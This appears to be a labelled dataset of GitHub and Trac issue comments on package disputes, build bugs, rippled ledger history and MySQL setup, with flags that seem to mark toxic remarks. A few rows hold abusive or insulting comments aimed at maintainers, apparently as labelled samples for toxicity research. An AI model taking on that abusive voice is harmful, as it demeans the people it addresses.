pypi-legacy/pypa/759/356918767,"You seem frustrated, and I can understand, but I think that calling the package ""fake"" and ""next to worthless"" is a bit of an overstatement. It may cause issues for your particular installation (in which case, don't install it! 😄 ) but it's a package that someone worked on and contributed to the community. It may not do much that you find useful, but it does something. The package's description states that it is a ""Command line to private gist. Example gi.py myFile"". From examining the code, that appears to be exactly what it does. Saying that ""everyone would benefit"" if it was deleted may be an expression of your frustration, but is probably not accurate. That's a common issue for packages on PyPI, not at all unique to this one. Could the metadata for this package be updated to reflect its state better? Sure. But at the time it was published, pip didn't support  so there was little motivation to do so. Package name conflicts are a common issue, and not one that (outside of the standard library) PyPI usually has any role in. The solution is to not install conflicting distributions. 🤷‍♂️ It does appear that the original repository has moved, but the owner still exists at  Perhaps you could try contacting them through one of their other repos about this package. ",False,True,False,pypi-legacy/pypa/759
pypi-legacy/pypa/759/357006793,"@friend Thank you for your thoughtful response. @friend, Thanks for your feedback! PyPI does not currently and does not plan to implement any policies regarding removal of packages based on their perceived quality. Once PEP 541 is implemented there will be recourse for abandoned projects, name conflicts, and legal issues. ",False,True,False,pypi-legacy/pypa/759
python-sdk/leancloud/289/273419553,Current coverage is 85.41% (diff 85.00%) ,False,True,False,python-sdk/leancloud/289
python-sdk/leancloud/289/273761779,发现上传文件到 S3 的时候，如果调用获取 file_tokens 接口时，mime_type 为 null，再上传到 s3 时会返回 403 相应，同时 body 为： @friend 有思路吗？ ,False,True,False,python-sdk/leancloud/289
qTox/tux3/425/45555453,Is anyone else getting introduced after #140 in widget/camera.cpp ,False,True,False,qTox/tux3/425
qTox/tux3/425/58759032,I'm getting this message as well. ,False,True,False,qTox/tux3/425
qTox/tux3/600/47534192,"↑ Ring to peer, peer rejects call, after that qTox shows ↓  ",False,True,False,qTox/tux3/600
qTox/tux3/600/61403213,"There should be something in chat log, showing what actually happened, similar to  ",False,True,False,qTox/tux3/600
qTox/tux3/600/61403719,"If we start adding messages in the chat about what happens with call, we might as well do it not just when someone rejects a call, so let's make another issue for that. ",False,True,False,qTox/tux3/600
rack/rack/1016/134870028,RFC 7239 is an IETF proposed standard for a HTTP  request header that aims to replace non-standard  headers. This commit allows the URI scheme to be detected based on the value of the  token in that header. I have prioritised the  header over the non-standard headers as I think it's preferable to use the standard header when specified. Multiple values for  are allowed by the standard; the first one is preferred here as it's the most likely to indicate the protocol used by the original client. I've been careful to support mixed case in the header and optional double quotes for the  value as specified in the RFC. ,False,True,False,rack/rack/1016
rack/rack/1016/186223684,"This is good, but I think if Rack introduces detection of SSL from this header, it should also give precedence to  values here in place of  in  It would be unpredictable behaviour for Rack to support only some parts of this header and not others. ",False,True,False,rack/rack/1016
rack/rack/1016/186798802,"I've added some tests to  and I'm having difficulty getting the logger to recognise the new header. At the top of that file, I have In the test, I have How do I set the new header when mocking a request? I'd be grateful for any help. I've pushed my code to a temporary branch ",False,True,False,rack/rack/1016
rack/rack/1016/186805175,"Your  is specifying  as a response header rather than a request header. You want to specify the header as an argument to , similar to ",False,True,False,rack/rack/1016
rack/rack/1016/186227853,"@friend That's a good point, thanks @friend - I'll look at that. ",False,True,False,rack/rack/1016
rack/rack/1016/186917229,"Thanks @friend, that did it. I've opened a new PR supporting all relevant tokens from RFC 7239 in ",False,True,False,rack/rack/1016
rack/rack/1016/186241393,I've spotted a couple of small improvements I can make - I'll close this will I work on those. ,False,True,False,rack/rack/1016
react-devtools-experimental/bvaughn/83/430068128,"I think this helps explore what exactly you're trying to select, as well get a general sense of the hierarchy. To reduce the noise, I throttled the highlighting by 200ms. That also helps avoid highlighting too early when you're just moving the cursor from the panel into the app. ",False,True,False,react-devtools-experimental/bvaughn/83
react-devtools-experimental/bvaughn/83/480534017,"Btw I think I'm going to write a small throttle+memo util for #74. Maybe we could use it here too, since it seems conceptually similar. ",False,True,False,react-devtools-experimental/bvaughn/83
react-devtools-experimental/bvaughn/83/480958837,"Regarding my throttle comment above, I think it would read a little cleaner to do something like Then  and  could both just call  directly. Edit diff ",False,True,False,react-devtools-experimental/bvaughn/83
react-devtools-experimental/bvaughn/83/481000198,"Don't care, but I think it would be a  nice change to make before merging. ",False,True,False,react-devtools-experimental/bvaughn/83
react-helmet/nfl/373/320104503," Hey, ♠HelmetWrapperdeepEqualHelmetWrapperPureComponent`? ",False,True,False,react-helmet/nfl/373
react-devtools-experimental/bvaughn/83/480980817,Do you want to do this or I'll do it? ,False,True,False,react-devtools-experimental/bvaughn/83
react-helmet/nfl/373/391660449,Same here. Is there a solution to this? ,False,True,False,react-helmet/nfl/373
react-helmet/nfl/373/392650715,"Yeh same. The work around is to not use react children to pass in   tags, and use the props way ",False,True,False,react-helmet/nfl/373
react-helmet/nfl/373/403744893,Just ran into this issue as well. Only saw it happening for Safari and Chrome browsers. ,False,True,False,react-helmet/nfl/373
react-helmet/nfl/373/404317158,What is the reasoning behind the deep equality check? Per the React docs... ,False,True,False,react-helmet/nfl/373
react-helmet/nfl/373/407980133,"I believe you can also work around this by applying a unique  prop to the  component, for example . Perhaps a bit cleaner than using the props method above. ",False,True,False,react-helmet/nfl/373
react-helmet/nfl/373/407982283,@friend not sure how that could speed up  in  ,False,True,False,react-helmet/nfl/373
react-helmet/nfl/373/407982788,"@friend Sorry, that was a reference to the  error and presumably  - not anything perf related. ",False,True,False,react-helmet/nfl/373
react-helmet/nfl/373/407983661,"@friend this error happens because ReactHelmet compares props with deepEqual and when there are children in props it iterate over children as well and since those children are React components (not a plain objects) it simply overflows the stack. The workaround is to avoid providing any children to  component, but anyway, deepEqual is still bad. ",False,True,False,react-helmet/nfl/373
react-helmet/nfl/373/407983910,"So, I don't see any reason why  needs a  prop ",False,True,False,react-helmet/nfl/373
react-helmet/nfl/373/407984219,"@friend Gotcha! Well in that case,  solves the problem because deepEqual never gets called in  as the component re-mounts instead of updating. Hence, no stack overflow. Was very useful in my case. ",False,True,False,react-helmet/nfl/373
react-helmet/nfl/373/407985396,"Hm, interesting. Do you have a link to read more about re-mounts of keyed elements? ",False,True,False,react-helmet/nfl/373
react-helmet/nfl/373/407986659," when the key changes it tells the reconciliation algorithm that the element in the new tree is different from the element in the old tree. If the new key isn't in the children in old tree, a new component is mounted. If the new key was in the children in the old tree the element will be re-used. ",False,True,False,react-helmet/nfl/373
react-helmet/nfl/373/407987711,"Aha, you mean that you have to update that key on every render.  Yep, that seems faster than deepEqual, but still not quite clean as fix deepEqual or avoid children. ",False,True,False,react-helmet/nfl/373
react-helmet/nfl/373/407988469,"Well, you only have to update the key when the underlying children change. In my case that happens when that particular view URL changes, but you can use any string representation. Maybe someone has a react-router match.params change which updates the title or meta information - that'd be a good spot to use  IMO. Anything where state affects the children. ",False,True,False,react-helmet/nfl/373
react-helmet/nfl/373/407988974,It might not work in some cases. Either way I think we're all in agreement that deepEqual is a bad practice in sCU. ,False,True,False,react-helmet/nfl/373
react-helmet/nfl/373/413159272,"This is a really bad bug - as the props way is not even the documented recommended way to pass metadata to helmet, and there is no other workaround. ",False,True,False,react-helmet/nfl/373
react-helmet/nfl/373/417666275,Just replace it by ,False,True,False,react-helmet/nfl/373
react-helmet/nfl/373/435802595,Why this is still not adressed? ,False,True,False,react-helmet/nfl/373
react-helmet/nfl/373/441221826,1)  trick doesn't help in all cases 2) Library still crashes in 5.2.0 This bug is devastating. Time to find another library? 😢 ,False,True,False,react-helmet/nfl/373
react-helmet/nfl/373/441413601, was merged into master. I would like to get the roll-up PR merged and we can release a beta version for feedback. ,False,True,False,react-helmet/nfl/373
react-helmet/nfl/373/442710543,I have the same problem............... ,False,True,False,react-helmet/nfl/373
react-helmet/nfl/373/442728992,"I believe it's merged to  branch, we need to wait them to release a new version ",False,True,False,react-helmet/nfl/373
react-helmet/nfl/373/446052884,"I can understand why this guy is frustrated, given that there is no new release for this package more than a year, but I don't agree on how he diss the maintainers or contributers. I think you guys should have released a patched version for v5 without the rollup. ",False,True,False,react-helmet/nfl/373
react-helmet/nfl/373/446090001,"I few months ago (when I failed to use this library) - I wrote another one. It's not a drop in replace due to different design (does not create title/meta tags), but could save your day - ",False,True,False,react-helmet/nfl/373
react-helmet/nfl/373/446128006,@friend is right a patch version will be great at least we can publish the changes to our production application without any nasty hacks to fix this issue. ,False,True,False,react-helmet/nfl/373
react-helmet/nfl/373/446162172,"My application crashes frequently due to this bug. If this bug isn't resolved before our product launch, I'm forced to replace it with another lib / my own implementation 😕 I guess it's not too hard to release a v5 patch? Has nothing to do with the current work on v6 right? ",False,True,False,react-helmet/nfl/373
react-helmet/nfl/373/446643456,I came across this issue as well.  Looking forward to the next release with the fix. ,False,True,False,react-helmet/nfl/373
react-helmet/nfl/373/446944087,"For some strange reason it happens just for one person in our office, so we haven't noticed this bug during development and tests. Any chance of releasing the beta version soon? ) ",False,True,False,react-helmet/nfl/373
react-helmet/nfl/373/447561484,I got a temporary workaround for this issue. 1) Clone the master branch 2) Copy all the files that are inside the  3) Paste that inside  4) Convert this code with  into Make sure the import path is correct. Once the fix is published to NPM you can delete the  folder and change the ,False,True,False,react-helmet/nfl/373
react-helmet/nfl/373/447869292,Hello guys. Any news to just publish patched version to NPM? ,False,True,False,react-helmet/nfl/373
react-helmet/nfl/373/447927882,"Remember how it all started in 2015? So much politeness and willingness to serve the community. Naive.  part of the team that open sourced it. I can PR some code, but I wanted to check with you before I started writing code. lmk, thanks. We are using React-Helmet in all of our new react websites, we are also seeking feedback so we can improve on our open source workflow. We plan to release more and the feedback would help tremendously. Three years passed and no one cares anymore. Reminds me of some clumsy accidental male/female relationships. Frontend was blooming that time. Now it's all starting to rot. ",True,True,False,react-helmet/nfl/373
react-helmet/nfl/373/447939847,"Please everyone, give @friend a rest or pay him money for working on this issue. Everyone can fork this lib and patch the code or switch to react-helmet-async or use an object for configuration. There are a lot of alternatives. ",False,True,False,react-helmet/nfl/373
react-helmet/nfl/373/448062956,"Wow, people are rude. ",False,True,False,react-helmet/nfl/373
react-helmet/nfl/373/448069883,"Ok, I can to pay something. What the cost you’re talking about? We just need a working package, and we know what the “open source” means. ",False,True,False,react-helmet/nfl/373
react-helmet/nfl/373/448104302,"Dont forget - you may fork this repo and publish as . The problem is already solved, fix is in the master branch - just not published to . ",False,True,False,react-helmet/nfl/373
react-helmet/nfl/373/448318628,"Hi all, Quick update. @friend and I got the required permission to NPM. We will be publishing to NPM today or tomorrow. because the thread is getting a little out of hand, I'm closing and locking the thread. I will be adding a code of conduct and other community support documentation.  you all, and thank you for being apart of the community. ",False,True,False,react-helmet/nfl/373
react-helmet/nfl/373/448340719,"Thanks everyone, publishing is working now again.  We should be able to post new NPM builds with ease. ",False,True,False,react-helmet/nfl/373
react-image-lightbox/frontend-collective/99/296077481,position absolute? Are you fucking idiots? ,True,True,False,react-image-lightbox/frontend-collective/99
react-only-intern-23/GroceriStar/80/344316047,"Bumps bootstrap from 4.1.2 to 4.1.3. &lt;details&gt; &lt;summary&gt;Release notes&lt;/summary&gt;  *Sourced from [bootstrap's releases]( []( Ship v4.1.3 - []( dist - []( fix(tests) visual plugins tests - []( Allow background images for active buttons - []( Clarify to close [#26329]( []( fix  on IE10/11 - []( Fix modal overflow style nesting ([#26742]( []( Merge branch 'document-tooltip-flickering' of  []( [#26912]( fix custom file input z-index - []( Fix property order - Additional commits viewable in [compare view]( /&gt;  [![Dependabot compatibility score]( will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting .  ---  &lt;details&gt; &lt;summary&gt;Dependabot commands and options&lt;/summary&gt; &lt;br /&gt;  You can trigger Dependabot actions by commenting on this PR -  will rebase this PR -  will merge this PR after your CI passes on it -  will close this PR and stop Dependabot creating any more for this minor/major version (unless you reopen the PR or upgrade to it yourself) -  will reopen this PR -  will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself) -  will set the current labels as the default for future PRs for this repo and language -  will set the current reviewers as the default for future PRs for this repo and language -  will set the current assignees as the default for future PRs for this repo and language -  will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme  Additionally, you can set the following in your Dependabot [dashboard]( Update frequency (including time of day and day of week) - Automerge options (never/patch/minor, and dev/runtime dependencies) - Pull request limits (per update run and/or open at any time) - Out-of-range updates (receive only lockfile updates, if desired) - Security updates (receive only security updates, if desired)  Finally, you can contact us by mentioning @friend.  &lt;/details&gt; ⚠️  Dependabot is rebasing this PR ⚠️ Sit tight and this PR will be updated for you in a minute. If you make any changes yourself then they'll take precedence over the rebase (which will be abandoned). ",False,True,False,react-only-intern-23/GroceriStar/80
react-popper/FezVrasta/111/379496122,"@friend having done a lot of experimentation, I strongly believe that this issue needs to be re-opened. Ultimately, the combination of packages that I'm using (SharePoint Framework, React, React DOM, Reactstrap, FontAwesome and others), require that the webpack resolver modules paths contains , without this in the path for example it is absolutely impossible to include a FontAwesome icon in a Reactstrap button, because react throws errors that are not thrown otherwise. The ultimate fix is to use another name for your  file so that conflicts aren't an issue - changing configurations when those configuration changes are breaking changes for many other packages and package combinations isn't appropriate. ",False,True,False,react-popper/FezVrasta/111
react-popper/FezVrasta/111/308297571,"Issue description react-popper is a dependency of reactstrap, which I am attempting to use in s SharePoint Framework project.  SharePoint Framework (SPFx) uses webpack extensively, and react-popper is causing webpack warnings which in turn lead to component load failures because react-popper has not been properly included in the output. Discussion of this issue is linked to an open issue in the SharePoint Dev Docs repository, and while the original issue was thought to be a fault in upgrading SPFx to use React 16, investigation has indicated an issue specifically with react-popper - see sp-dev-docs issue 1315. CodePen demo This is a build issue specific to use of react-popper in conjunction with other frameworks and cannot be reproduced in CodePen alone. Steps to reproduce the problem  Create a new SharePoint Framework solution as per the standard guidelines a. Install gulp and the yeoman generator for SPFx  b. Create a new SPFx Web Part  , accept all defaults Update the  file to use React 16 and  Add bootstrap, jquery, reactstrap a. Note that recently released reactstrap@friend.0.0 uses react-popper@friend.8.3 Add any reactstrap component to the SPFx solution Build and deploy per standard processes  a.   b.   c.  Deploy per standard SharePoint Processes Attempt to load the Web Part in a SharePoint Modern Experience page.  What is the expected behavior? It is expected that no warnings will be issued by webpack, and that the component will load correctly. What went wrong? Webpack issues the following warnings during the bundle phase Warning - [webpack] 'dist' ./node_modules/react-popper/lib/Popper.js There are multiple modules with names that only differ in casing. This can lead to unexpected behavior when compiling on a filesystem with other case-semantic. Use equal casing. Compare these module identifiers * D/PROJECTS/Info.Insch.SpfxSandbox/node_modules/source-map-loader/index.js!D/PROJECTS/Info.Insch.SpfxSandbox/node_modules/react-popper/lib/Popper.js     Used by 1 module(s), i. e.     D/PROJECTS/Info.Insch.SpfxSandbox/node_modules/source-map-loader/index.js!D/PROJECTS/Info.Insch.SpfxSandbox/node_modules/react-popper/lib/react-popper.js * D/PROJECTS/Info.Insch.SpfxSandbox/node_modules/source-map-loader/index.js!D/PROJECTS/Info.Insch.SpfxSandbox/node_modules/react-popper/lib/popper.js     Used by 2 module(s), i. e.     D/PROJECTS/Info.Insch.SpfxSandbox/node_modules/source-map-loader/index.js!D/PROJECTS/Info.Insch.SpfxSandbox/node_modules/react-popper/lib/Popper.js  When loading the Web Part, SharePoint Framework issues the following error [SPLoaderError.loadComponentError] ***Failed to load component ""2a846d5b-9989-45cc-b7b8-68d8d4e8c231"" (HelloWorldWebPart). Original error ***Failed to load entry point from component ""2a846d5b-9989-45cc-b7b8-68d8d4e8c231"" (HelloWorldWebPart). Original error Error loading     Cannot read property 'placements' of undefined  ***INNERERROR ***Failed to load entry point from component ""2a846d5b-9989-45cc-b7b8-68d8d4e8c231"" (HelloWorldWebPart). Original error Error loading     Cannot read property 'placements' of undefined ***CALLSTACK Error     at t [as constructor] (    at new t (    at Function.e.buildErrorWithVerboseLog (    at Function.e.buildLoadComponentError (    at     at &lt;anonymous&gt;  Any other comments? While the error reported when SPFx attempts to load the Web Part appear initially to be an SPFx issue, investigation has identified that the  property which is the root cause of the load failure is from react-popper, and is related to the webpack warnings issued when generating the full output for the web part. As far as I can see, this is because webpack is assuming the reference in react-popper's  file loading the 'real' popper.js is in fact a reference to the same file. Do you have any suggestions which will allow react-popper to be successfully consumed by webpack? Note that I cannot change away from webpack as this is an integral component of the SharePoint Framework. ",False,True,False,react-popper/FezVrasta/111
react-popper/FezVrasta/111/379496308,"I find it so difficult to think that you are the only one having this problem honestly... If enough people report this we can think about a solution. Until then, I'm convinced the problem is on your side. ",False,True,False,react-popper/FezVrasta/111
react-popper/FezVrasta/111/379496783,"@friend If you looked at the linked issue over at the SharePoint Framework side in my original report, you would see that I'm not the only one with this problem; and that it's not unique to my combination of packages.  Sure, people might not be reporting it directly here, but that's because they're indirectly consuming your package via npm's version of dependency hell, not using it intentionally or knowingly! ",False,True,False,react-popper/FezVrasta/111
react-popper/FezVrasta/111/379497112,"It's still a problem of the sharepoint configuration, I mean, I don't even know what it's it, but if it happens only with it there must be a reason I guess? How do you expect me to change the name of a file used in the library just because your configuration is trying to import stuff from where it's not supposed to? ",False,True,False,react-popper/FezVrasta/111
react-popper/FezVrasta/111/379498069,"So, instead of carrying out a relatively straightforward fix on your side which not only would resolve this issue but also prevent the same issue with the hundreds / thousands of potential package and configuration combinations out there, stopping lots of other developers falling into the same trap - often (as in this case) completely outwith their control, you opt to disown the problem and put it upon every potential consumer of your package to solve instead? I have no direct control over the SharePoint Framework configuration; I'm just a consumer of that set of packages. I have no direct control over how Reactstrap works, I'm just consuming that package, I have no direct control over FontAwesome, again, just a consumer here. I have no direct control over React ... guess what?  Yup, a consumer! I shouldn't even have to care about all of that; especially as I'm not directly consuming react-popper - it's buried deep in a set of dependencies I also have no control over. Surely it's a more 'customer focused' approach to just resolve the problem with the name conflicts than it is to force a mere consumer of packages to play piggy-in-the-middle between multiple projects, all the while wasting time and making no progress on their own projects?  If I gave an answer such as yours in my day job I'd soon not have a day job - so why is it OK for you to do so just because this project is open source?! ",True,True,False,react-popper/FezVrasta/111
react-popper/FezVrasta/111/379498719,"I know I may be a ""weird"" person to talk to, but my point is We may fix the problem with  renaming that file, and everybody would be happy and would go to get drunk and sing in the streets, but tomorrow some other package will make the same mistake, and everybody will be sad again. Is this where we want to go? About all the day job stuff etc, if you are willing to pay me my hourly rate I'll be happy to show you all my professionality 😉 ",False,True,False,react-popper/FezVrasta/111
react-popper/FezVrasta/111/379499802,"How about we balance your hourly rate with the several hundred hours I've already expended on this problem at my hourly rate?! Or, better yet, how about you spend the 45 seconds it would take you to fix the issue! ",False,True,False,react-popper/FezVrasta/111
react-popper/FezVrasta/111/379500148,"I'm taking care of the problem here, for free. ",False,True,False,react-popper/FezVrasta/111
react/facebook/7245/164807906,I inlined some requires in #7188 to fix the build size regression. However this caused an issue with Jest due to it resetting module registry between tests. This is a temporary fix to #7240. It should be reverted as part of #7178. Test plan  Verify #7240 is fixed by following its repro instructions. You would need to build React and copy  into its .  Verify a React example (e.g. ) in the repo runs with minified and unminified React.  Check that the minified build size has not increased.   Reviewers @friend @friend (Yes I know it’s super ugly. The upside is I know Jest a little better now!) ,False,True,False,react/facebook/7245
react/facebook/7245/231700562,@friend Does this look reasonable to you as a stopgap solution? (We have a better solution in #7178.) ,False,True,False,react/facebook/7245
react/facebook/7245/231700664,"@friend Do you think we’ll get #7178 in this week? If yes, maybe we don’t need to bother with this fix. ",False,True,False,react/facebook/7245
react/facebook/7245/231855104,@friend I'll get that PR ready in a few days. Just to clarify -- we run these tests with the development build right? ,False,True,False,react/facebook/7245
react/facebook/7245/231929618,"Yeah this seems reasonable. I'm sorry for the pain. I'm however unsure how rollup would solve this as people will use the dev code (react/lib/*), not the production build when writing unit tests. ",False,True,False,react/facebook/7245
react/facebook/7245/231963851,"Yes, we run tests with development CommonJS build. Rollup would solve this because we can move requires back to the top of the file (like Jest prefers) but it would still eliminate dead code in prod. Browserify is not that smart which is why I inlined them, but I won't have to after switching to Rollup. ",False,True,False,react/facebook/7245
react/facebook/7245/231964595,"oh, yeah, that makes sense! ",False,True,False,react/facebook/7245
react/facebook/7245/232648870,"Okay, this should work, right? This is getting super hacky. 😢 ",False,True,False,react/facebook/7245
react/facebook/7245/232649684," This should work in FB because  should give  as it’s an unknown global. This should work in CommonJS because  should give whatever your bundler gives you, and we don’t care whether it exists or not thanks to the same check. This should work in our UMD builds because we don’t use  anywhere except those  checks so it’s safe to force Browserify to use  there. Our  clauses still work because they get envified. This works in Jest because, well,  exists there.  ",False,True,False,react/facebook/7245
react/facebook/7245/232966117,@friend Shall we do it? ,False,True,False,react/facebook/7245
react/facebook/7245/233031899,"Sure, but let's make sure this doesn't stick around for long. ",False,True,False,react/facebook/7245
redmine_didyoumean/abahgat/15/4174519,Added new locale file to support spanish translations ,False,True,False,redmine_didyoumean/abahgat/15
redmine_didyoumean/abahgat/15/5208921,Thanks! ,False,True,False,redmine_didyoumean/abahgat/15
registry/npm/244/276120720,"If removing a package from the list in 'add package' and then clicking 'cancel' without changing the access level for the remaining packages, the access levels will change if those packages were already added for the team.  Expected nothing to change when clicking cancel. Related to issue that 'add package' lists packages already added to the team. ",False,True,False,registry/npm/244
registry/npm/244/377397444,"@friend context, please. which tool are you using for 'add package' and 'clicking cancel'? ",False,True,False,registry/npm/244
reportbook/Jimdo/506/331823298,Implemented in #507 ,False,True,False,reportbook/Jimdo/506
rippled/ripple/2241/263939640,Why is account_tx failing? Node is sync'd. ,False,True,False,rippled/ripple/2241
rippled/ripple/2241/335243297,"It is a bug with how the  RPC is handling the default ledger range. Until we land a fix, you will need to specify a minimum or maximum range for the ledgers. A value of  means to use the minimum/maximum available validated ledger, but the command line parser thinks  is a flag rather than a number. Can you try the following for now and see if it works? ",False,True,False,rippled/ripple/2241
rippled/ripple/2241/335249278,Yes that works. ,False,True,False,rippled/ripple/2241
rippled/ripple/2241/335250615," is showing 8 transactions when I lookup my address, while my call ♠root@friend~# curl -X POST -d '{ ""method""  ""account_tx"", ""params""  [ { ""account""  ""rBe...C6G"",""ledger_index_min""  32570, ""ledger_index_max""  33374525 } ] } '  is showing only 4 transactions! ",False,True,False,rippled/ripple/2241
rippled/ripple/2241/335254304,"I believe the info tool uses s2.ripple.com, which is a full history server.  How much history are you storing locally (that is the  field in  RPC)? ",False,True,False,rippled/ripple/2241
rippled/ripple/2241/335256934,"I understand, and yes you are right. ♠         ""complete_ledgers""  ""33371066-33374924"",` Is there any way to download older ledgers? ",False,True,False,rippled/ripple/2241
rippled/ripple/2241/335259452,"If there are specific ledgers you want, you can request them via the ledger_request command. If you want to increase the amount of ledgers you store on your local , you can edit the  value in your server's . As noted in #2129, this is rather large to store the full history. At this time, we still do not have support for storing just the history of specific accounts. ",False,True,False,rippled/ripple/2241
rippled/ripple/2241/335262073,Thank you very much for your help! ,False,True,False,rippled/ripple/2241
rippled/ripple/2241/335263878,I have updated my  Will it now download all the previous ledgers or will it keep only new ledgers? How much HDD storage does the full ledger since 0 requires at the moment? ,False,True,False,rippled/ripple/2241
rippled/ripple/2241/337203899,We received a payment that is showing up on  but not on our node ,False,True,False,rippled/ripple/2241
rippled/ripple/2241/337879491,"Yes The smallest publicly available ledger is not 0 but 32570. That set aside, about 5 TB. You likely won't be able to use HDDs as a back end to rippled though, querying a historic ledger creates hundreds of thousands of random reads all over the database. SSDs typically can respond to a few thousand or tens of thousands of  these per second, HDDs are more in the tens to hundreds range. ",False,True,False,rippled/ripple/2241
rippled/ripple/2241/338056634,"@friend The response to account_tx will always tell you which ledgers it queried over. Unless a server is seriously misconfigured, this should be 100% reliable. If the account_tx says is queried from ledger X to ledger Y and is a complete response (no marker for continuation), it should always include every relevant transaction in those ledgers. I would suggest you only try to keep a month or two of history on your node. In the rare cases where you need more history, you can query s2.ripple.com. That's a best effort service with no promoses, so I wouldn't point any live systems at it. But it's available if you need more history than your own servers, or the s1 cluster, hold. ",False,True,False,rippled/ripple/2241
rippled/ripple/2241/338154039,"Thank you for the help. Our Ripple node is currently using 14.6GB of RAM, is this normal usage? 😮 ",False,True,False,rippled/ripple/2241
rippled/ripple/2241/338156943,"That's a bit high, but sounds about right if you were querying historic data and not just validating. 14.6 GB is not the highest by far I've seen on my node, so I'd call that medium usage. ",False,True,False,rippled/ripple/2241
rpki.net/dragonresearch/198/238309960,"took a snapshot of the vm so we could play {{{ rpki.dfw.rg.net/root# rpki-sql-setup Please enter your MySQL root password  (1007, ""Can't create database 'irdbd'; database exists"") }}} i guess it is not idempotent ( Trac comment by randy on 2015-08-06T071611Z ",False,True,False,rpki.net/dragonresearch/198
rpki.net/dragonresearch/198/238309962,{{{ rpki.dfw.rg.net/root# mysql -u rpki -p Enter password &lt;rpki.conf shared_sql_password&gt; ERROR 1045 (28000) Access denied for user 'rpki'@'localhost' (using password YES) }}} Trac comment by randy on 2015-08-06T072004Z ,False,True,False,rpki.net/dragonresearch/198
rpki.net/dragonresearch/198/238309966,"It was the autogenerated password!!! {{{ mysql&gt; set password for rpki@friend = PASSWORD('&lt;shared_sql_password&gt;'); Query OK, 0 rows affected (0.01 sec) mysql&gt; flush privileges; Query OK, 0 rows affected (0.00 sec) mysql&gt; Bye rpki.dfw.rg.net/root# mysql -u rpki -p Enter password &lt;shared_sql_password&gt; ERROR 1045 (28000) Access denied for user 'rpki'@'localhost' (using password YES) }}} We set it to a simple password and it worked! Trac comment by randy on 2015-08-06T072811Z ",False,True,False,rpki.net/dragonresearch/198
rpki.net/dragonresearch/198/238309954,i have to wonder if {{{rpki-sql-setup}}} is idempotent.  but i do not want to mess things up by experimenting Trac comment by randy on 2015-08-06T065659Z ,False,True,False,rpki.net/dragonresearch/198
rpki.net/dragonresearch/198/238309978,"we deinstalled rpki-ca and rpki-rp\ we deleted the rpki-related databases\ we left the rpki.conf with the simpler password\ we installed, presumably using the simpler password\ back to rpki@friend problem Trac comment by randy on 2015-08-06T080155Z ",False,True,False,rpki.net/dragonresearch/198
rpki.net/dragonresearch/198/238309972,so now we can log into mysql as the rpki user.  but we believe that the rpki.conf shared_sql_password was compiled into some code somewhere.  and we do not know where to find it. Trac comment by randy on 2015-08-06T073335Z ,False,True,False,rpki.net/dragonresearch/198
rpki.net/dragonresearch/198/238309982,"This isn't enough information to debug anything.  ""Doesn't work"" how? What happened?  What did the output say when running ""apt-get install""?  Etcetera. Trac comment by sra on 2015-08-06T120955Z ",False,True,False,rpki.net/dragonresearch/198
rpki.net/dragonresearch/198/238309977,"{{{ rpki.dfw.rg.net/root# rpki-sql-setup --drop-and-create Please enter your MySQL root password  rpki.dfw.rg.net/root# rpki-manage createsuperuser Traceback (most recent call last)   File ""/usr/sbin/rpki-manage"", line 13, in &lt;module&gt;     execute_from_command_line()   File ""/usr/lib/python2.7/dist-packages/django/core/management/init.py"", line 399, in execute_from_command_line     utility.execute()   File ""/usr/lib/python2.7/dist-packages/django/core/management/init.py"", line 392, in execute     self.fetch_command(subcommand).run_from_argv(self.argv)   File ""/usr/lib/python2.7/dist-packages/django/core/management/base.py"", line 242, in run_from_argv     self.execute(args, **options.dict)   File ""/usr/lib/python2.7/dist-packages/django/core/management/base.py"", line 285, in execute     output = self.handle(args, options)   File ""/usr/lib/python2.7/dist-packages/django/contrib/auth/management/commands/createsuperuser.py"", line 80, in handle     default_username = get_default_username()   File ""/usr/lib/python2.7/dist-packages/django/contrib/auth/management/init.py"", line 183, in get_default_username     auth_app.User._default_manager.get(username=default_username)   File ""/usr/lib/python2.7/dist-packages/django/db/models/manager.py"", line 151, in get     return self.get_queryset().get(*args, kwargs)   File ""/usr/lib/python2.7/dist-packages/django/db/models/query.py"", line 301, in get     num = len(clone)   File ""/usr/lib/python2.7/dist-packages/django/db/models/query.py"", line 77, in len     self._fetch_all()   File ""/usr/lib/python2.7/dist-packages/django/db/models/query.py"", line 854, in _fetch_all     self._result_cache = list(self.iterator())   File ""/usr/lib/python2.7/dist-packages/django/db/models/query.py"", line 220, in iterator     for row in compiler.results_iter()   File ""/usr/lib/python2.7/dist-packages/django/db/models/sql/compiler.py"", line 710, in results_iter     for rows in self.execute_sql(MULTI)   File ""/usr/lib/python2.7/dist-packages/django/db/models/sql/compiler.py"", line 781, in execute_sql     cursor.execute(sql, params)   File ""/usr/lib/python2.7/dist-packages/django/db/backends/util.py"", line 53, in execute     return self.cursor.execute(sql, params)   File ""/usr/lib/python2.7/dist-packages/django/db/utils.py"", line 99, in exit     six.reraise(dj_exc_type, dj_exc_value, traceback)   File ""/usr/lib/python2.7/dist-packages/django/db/backends/util.py"", line 53, in execute     return self.cursor.execute(sql, params)   File ""/usr/lib/python2.7/dist-packages/django/db/backends/mysql/base.py"", line 124, in execute     return self.cursor.execute(query, args)   File ""/usr/lib/python2.7/dist-packages/MySQLdb/cursors.py"", line 174, in execute     self.errorhandler(self, exc, value)   File ""/usr/lib/python2.7/dist-packages/MySQLdb/connections.py"", line 36, in defaulterrorhandler     raise errorclass, errorvalue django.db.utils.ProgrammingError (1146, ""Table 'irdbd.auth_user' doesn't exist"") }}} Trac comment by randy on 2015-08-06T074628Z ",False,True,False,rpki.net/dragonresearch/198
rpki.net/dragonresearch/198/238309984,"Ah, I see, you renamed an existing ticket with log.  Never mind. Trac comment by sra on 2015-08-06T121442Z ",False,True,False,rpki.net/dragonresearch/198
